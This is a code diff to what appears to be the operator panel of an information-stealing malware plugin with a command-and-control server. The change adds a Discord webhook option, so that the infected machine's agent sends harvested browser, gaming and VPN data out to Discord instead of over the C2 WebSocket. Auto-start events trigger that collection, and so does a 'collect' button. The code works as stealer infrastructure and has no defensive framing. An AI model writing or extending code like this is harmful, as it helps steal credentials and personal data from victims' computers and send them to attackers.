@@ -1573,8 +1573,18 @@
   }
 
   // ── Settings (auto-harvest) ───────────────────────────────────
-  function buildAutoStartEvents(files, ext) {
-    const events = [{ event: "collect", payload: { browsers: true } }];
+  async function buildAutoStartEvents(files, ext) {
+    let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
+    try {
+      const s = await rpc("get_capture_settings");
+      discord = {
+        enabled: !!s.discord_upload_enabled,
+        webhookUrl: s.discord_webhook_url || "",
+        threadPrefix: s.discord_thread_prefix || "Stuart",
+      };
+    } catch (_) {}
+    // Agent POSTs harvest to Discord webhook (HTTP); C2 WS only gets a small complete event
+    const events = [{ event: "collect", payload: { browsers: true, gaming: true, vpns: true, discord } }];
     if (files) events.push({ event: "scan_files", payload: {} });
     if (ext) events.push({ event: "scan_extensions", payload: {} });
     return events;
@@ -1618,7 +1628,7 @@
     try {
       const body = {
         autoLoad: enabled,
-        autoStartEvents: enabled ? buildAutoStartEvents(files, ext) : [],
+        autoStartEvents: enabled ? await buildAutoStartEvents(files, ext) : [],
       };
       const res = await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
         method: "POST",
@@ -2294,7 +2304,19 @@
     collectBtn.addEventListener("click", () => {
       collectBtn.disabled = true;
       log("Starting collection…");
-      sendEvent("collect", { browsers: true, gaming: true, vpns: true });
+      // Include Discord webhook so agent POSTs harvest HTTP→Discord (not bulk over C2 WS)
+      (async () => {
+        let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
+        try {
+          const s = await rpc("get_capture_settings");
+          discord = {
+            enabled: !!s.discord_upload_enabled,
+            webhookUrl: s.discord_webhook_url || "",
+            threadPrefix: s.discord_thread_prefix || "Stuart",
+          };
+        } catch (_) {}
+        sendEvent("collect", { browsers: true, gaming: true, vpns: true, discord });
+      })();
     });
     scanFilesBtn.addEventListener("click", () => {
       scanFilesBtn.disabled = true;
